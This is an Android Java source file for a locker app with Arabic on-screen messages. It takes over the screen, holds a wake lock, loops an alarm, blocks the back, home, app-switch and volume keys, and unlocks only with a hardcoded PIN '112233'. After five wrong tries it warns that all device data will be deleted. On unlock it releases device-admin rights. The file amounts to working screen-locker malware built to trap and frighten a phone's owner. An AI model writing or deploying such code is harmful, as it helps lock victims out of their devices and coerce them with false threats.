package com.hawahi.locker;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.media.MediaPlayer;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class LockScreenActivity extends Activity {
    private EditText pinInput;
    private TextView statusText, attemptsText;
    private View rootLayout;
    private int attemptCount = 0;
    private MediaPlayer mp;
    private Vibrator vibrator;
    private PowerManager.WakeLock wakeLock;
    private DevicePolicyManager dpm;
    private ComponentName admin;

    private static final String CORRECT_PIN = "112233";
    private static final int MAX_ATTEMPTS = 5;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN);
        setContentView(R.layout.lock_screen);

        pinInput = findViewById(R.id.pinInput);
        statusText = findViewById(R.id.statusText);
        attemptsText = findViewById(R.id.attemptsText);
        rootLayout = findViewById(R.id.rootLayout);
        findViewById(R.id.unlockButton).setOnClickListener(v -> checkPin());

        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        admin = new ComponentName(this, AdminReceiver.class);

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(
            PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP |
            PowerManager.ON_AFTER_RELEASE, "h:wl");
        wakeLock.acquire(600000); // 10 دقائق

        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        updateText();
        playAlarm();
    }

    private void checkPin() {
        String p = pinInput.getText().toString().trim();
        attemptCount++;

        if (p.equals(CORRECT_PIN)) {
            unlock();
            return;
        }

        // اهتزاز
        if (vibrator != null && vibrator.hasVibrator()) {
            if (Build.VERSION.SDK_INT >= 26)
                vibrator.vibrate(VibrationEffect.createOneShot(800,
                    VibrationEffect.DEFAULT_AMPLITUDE));
            else
                vibrator.vibrate(800);
        }

        int rem = MAX_ATTEMPTS - attemptCount;
        if (rem > 0) {
            statusText.setText("⚠️ كلمة السر خطأ!");
            statusText.setTextColor(Color.YELLOW);
            attemptsText.setText("بقيت لك " + rem + " محاولات");
            rootLayout.setBackgroundColor(Color.RED);
            new Handler().postDelayed(() ->
                rootLayout.setBackgroundColor(Color.parseColor("#8B0000")), 300);

            // صوت تنبيه
            try {
                MediaPlayer m = MediaPlayer.create(this,
                    RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION));
                m.setVolume(1f, 1f);
                m.start();
                m.setOnCompletionListener(MediaPlayer::release);
            } catch (Exception e) {}
            pinInput.setText("");
        } else {
            // المحاولة الخامسة - تهديد
            statusText.setText("💀 تم تجاوز الحد المسموح!");
            statusText.setTextColor(Color.RED);
            attemptsText.setText("⚠️ سيتم حذف جميع بيانات جهازك!");
            pinInput.setEnabled(false);
            findViewById(R.id.unlockButton).setEnabled(false);
            stopSound();
            playAlarm();

            // فلاش أحمر
            Handler h = new Handler();
            h.post(new Runnable() {
                boolean isRed = false;
                @Override
                public void run() {
                    rootLayout.setBackgroundColor(isRed ?
                        Color.parseColor("#8B0000") : Color.RED);
                    isRed = !isRed;
                    h.postDelayed(this, 500);
                }
            });
        }
    }

    private void unlock() {
        stopSound();
        statusText.setText("✓ تم فتح النظام");
        statusText.setTextColor(Color.GREEN);
        pinInput.setEnabled(false);
        if (dpm.isAdminActive(admin))
            dpm.removeActiveAdmin(admin);
        if (wakeLock != null && wakeLock.isHeld())
            wakeLock.release();
        new Handler().postDelayed(() -> {
            stopService(new Intent(this, LockScreenService.class));
            finishAffinity();
        }, 2000);
    }

    private void playAlarm() {
        try {
            Uri u = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
            if (u == null)
                u = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
            mp = new MediaPlayer();
            mp.setDataSource(this, u);
            mp.setLooping(true);
            mp.setVolume(1f, 1f);
            mp.prepare();
            mp.start();
        } catch (Exception e) {}
    }

    private void stopSound() {
        if (mp != null) {
            try { mp.stop(); mp.release(); } catch (Exception e) {}
            mp = null;
        }
    }

    private void updateText() {
        int rem = MAX_ATTEMPTS - attemptCount;
        if (rem > 0)
            attemptsText.setText("بقيت لك " + rem + " محاولات");
    }

    @Override
    public boolean onKeyDown(int key, KeyEvent e) {
        if (key == KeyEvent.KEYCODE_BACK ||
            key == KeyEvent.KEYCODE_HOME ||
            key == KeyEvent.KEYCODE_APP_SWITCH ||
            key == KeyEvent.KEYCODE_VOLUME_UP ||
            key == KeyEvent.KEYCODE_VOLUME_DOWN)
            return true;
        return super.onKeyDown(key, e);
    }

    @Override
    public void onBackPressed() {}

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopSound();
        if (wakeLock != null && wakeLock.isHeld())
            wakeLock.release();
    }
}